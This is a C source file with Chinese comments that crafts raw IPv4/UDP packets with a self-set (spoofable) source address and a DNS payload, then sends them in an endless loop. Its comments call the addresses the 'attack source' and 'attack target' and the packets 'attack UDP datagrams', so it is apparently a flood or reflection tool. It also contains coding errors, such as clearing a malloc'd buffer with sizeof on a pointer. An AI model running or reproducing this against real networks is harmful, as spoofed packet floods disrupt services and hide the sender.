/**
经过一晚上和一上午的调试，终于解决了一个问题：
本来是所有代码都在main里面，但是转成模块化的函数时，发出的数据包始终是畸形，
表现为ip报文的total lenght非常大，端口也不对，也没有正常的负载数据。
为什么会出现这种情况，仔细对比发现，把下面三个变量的顺序调换一下就不行，
并且下面三个变量任意一个都不能放在main外面作为全局变量，
这三个变量必须放在main函数体内才能正常运行,这显然是个诡异的逻辑错误。
后来发现存在两个问题，主要是编码习惯问题，
第一memset初始化时该用strlen却用了sizeof，这里可能导致过度清空了不能清空的数据
第二变量定义尽量不放在main外面作为全局变量，能用局部变量就最好用局部变量，
这是个编码规范和习惯问题，不注意容易导致莫名其妙的bug，gdb也没用，
而且导致的问题需要细心程度很高才能查出来
int sockfd;
int on;
char *data;
*/

#include	"udp.h"

//int main(int argc, char **argv)

int creator_udp(void)
{
	int sockfd, len_payload, len_total;
	struct sockaddr_in *src_addr, *dst_addr;

	char *buf, *payload;
	struct ip *header_ip;
	struct udphdr *header_udp;

	buf = malloc(200);
	payload = malloc(100);
	src_addr = malloc(sizeof(struct sockaddr_in));
	dst_addr = malloc(sizeof(struct sockaddr_in));

	header_ip = (struct ip *)buf;
	header_udp = (struct udphdr *)(buf + sizeof(struct ip));
	payload = buf + sizeof(struct ip) + sizeof(struct udphdr);

	memset(buf, '\0', sizeof(buf));

	memset(src_addr, '\0', sizeof(struct sockaddr_in));
	memset(dst_addr, '\0', sizeof(struct sockaddr_in));

	len_payload = payload_udp_dns(payload);

	len_total = sizeof(struct ip) + sizeof(struct udphdr) + len_payload;

	//构建原始套接字
	sockfd = sock_init_udp(src_addr, dst_addr);

	//初始化ip报头
	creator_udphdr_ip(header_ip, src_addr, dst_addr, len_total);

	//初始化udp报头，并填充数据
	creator_header_udp(header_udp, len_total);

	//ip校验和是否填充无所谓，网卡会自动计算出来
	header_ip->ip_sum = creator_check_sum(buf, IPPROTO_IP);

	//udp校验和
	header_udp->check = creator_check_sum(buf, IPPROTO_UDP);

//      printf("the ip_sum is %02x===\n", header_ip->ip_sum);
//      printf("the udp_sum is %02x===\n", header_udp->check);

	//发送udp数据包
	send_udp(sockfd, dst_addr, buf, len_total);

	return 0;
}

int sock_init_udp(struct sockaddr_in *src_addr, struct sockaddr_in *dst_addr)
{
	int sockfd, sockopt_on;

	/*创建一个UDP的原始套接字 */
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if (sockfd < 0) {
		exit(1);
	}

	/*设置套接字选项IP_HDRINCL,由用户程序填写IP头部 */
	setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &sockopt_on,
		   sizeof(sockopt_on));

	//setuid(getuid()); /*获得超级用户的权限*/

	/*数据报的长度即IP头部与UDP头部之后 */
	dst_addr->sin_family = AF_INET;
	dst_addr->sin_port = htons(DST_PORT);
	inet_aton(DST_IP, &(dst_addr->sin_addr));

	bzero(src_addr, sizeof(struct sockaddr_in));
	src_addr->sin_family = AF_INET;
	src_addr->sin_port = htons(SRC_PORT);
	inet_aton(SRC_IP, &(src_addr->sin_addr));

	return sockfd;
}

int
creator_udphdr_ip(struct ip *header_ip, struct sockaddr_in *src_addr,
		  struct sockaddr_in *dst_addr, int len_total)
{
	/*开始填充IP数据报的头部 */
	header_ip->ip_v   = IPVERSION;	        //IPV4 这个字段只能是整形
	//header_ip->ip_v = htons(IPVERSION);   //转换成网络序数字后，数据包能正常发出，但是version字段为0

	//header_ip->ip_hl = sizeof(struct ip) >> 2;      //IP数据报的头部长度
	header_ip->ip_hl  = 5;	                //这个字段只能是整形 ,转换成网络序数字导致数据包发送不出去

	//header_ip->ip_tos = 0xEC;             //服务类型不能转换成网络序号，也不能用整形，可以用十六进制
	header_ip->ip_tos = 0b11101000;	        //服务类型，最好是用二进制

	header_ip->ip_len = htons(len_total);	//IP数据报的长度，必须转网络序整数，否则校验和无法计算

	header_ip->ip_id  = htons(99);	        //这是个标志位，是否转网络序无所谓，不影响

	//ip flags字段，对应头文件说明
	//#define IP_RF                 0x8000  // reserved fragment flag       1000000000000000
	//#define IP_DF                 0x4000  // dont fragment flag           0100000000000000
	//#define IP_MF                 0x2000  //  more fragments flag         0010000000000000
	//#define IP_OFFMASK    0x1fff          // mask for fragmenting bits    用不了，原因不明
	//                      0xC000          //开启保留字段不分片位          0110000000000000

	//header_ip->ip_off = htons(0x4000);    //单独启用不分片字段
	//header_ip->ip_off = htons(0x02000);   //启用更多偏移位     //0010000000000000
	//header_ip->ip_off = htons(0x20B9);    //设置了偏移位会导致发布出去，原因目前不清楚
	header_ip->ip_off = htons(0xC000);	//这个字段必须转成网络序数字，启用保留和不分片字段

	header_ip->ip_ttl = 60;                 //ip_ttl只能是整形 ,不能转换成网络序数字

	header_ip->ip_p   = IPPROTO_UDP;	//传输层协议为UDP,只能是整形，也可以用宏

	header_ip->ip_sum = htons(0);	        //计算校验和之前必须置0，
	//如果不计算校验和，随便设置多少网卡都会计算并填充

	header_ip->ip_src = src_addr->sin_addr;	//源地址，即攻击来源，这个结构体已经是网络序
	header_ip->ip_dst = dst_addr->sin_addr;	//目的地址，即攻击目标，也这结构体已经是网络序

	printf("dst address is %s\n", inet_ntoa(dst_addr->sin_addr));
	printf("src address is %s\n", inet_ntoa(src_addr->sin_addr));

	return 0;
}

int creator_header_udp(struct udphdr *header_udp, int len_total)
{
	//======================开始填写UDP数据报============================//
	//通过强制类型转换，获取指向UDP头部的指针

	//这里是源端口和目的端口，必须要把整形数组的字节序转换为网络字节序
	header_udp->source = htons(SRC_PORT);
	header_udp->dest   = htons(DST_PORT);

	header_udp->check = 0;

	header_udp->len = htons(len_total - sizeof(struct iphdr) );

	return 0;
}

int
send_udp(int sockfd, struct sockaddr_in *dst_addr, char *buf, int len_total)
{
	int ret;
	while (1) {
		//发送攻击UDP数据报,这里第三个参数表示写入长度;
		//其实这个长度写大点无所谓，sendto自动会到\0停止写入。
		//抓包分析，这里的第三个参数就是ip报头的total length的值
		//注意：通常最好用strlen获取字符串长度，这里不能用strlen(buf)
		//因为buf经过强制转换过，strlen(buf)是1，必须使用一个较大的整形
		//由于buf是指定长度的数组，所以也可以用sizeof(buf)
		//如果buf是用malloc申请内存的，那么sizeof(buf)返回的是这个
		//指针编号的长度8，无法通过指针获取长度，也没必要，因为malloc已经指定
		ret = sendto(sockfd, buf, len_total, 0,
			     (struct sockaddr *)dst_addr,
			     sizeof(struct sockaddr));

		perror("sendto of udp");
		printf("the rerun value of send is %d===\n", ret);
		sleep(1);
	}

	return 0;
}
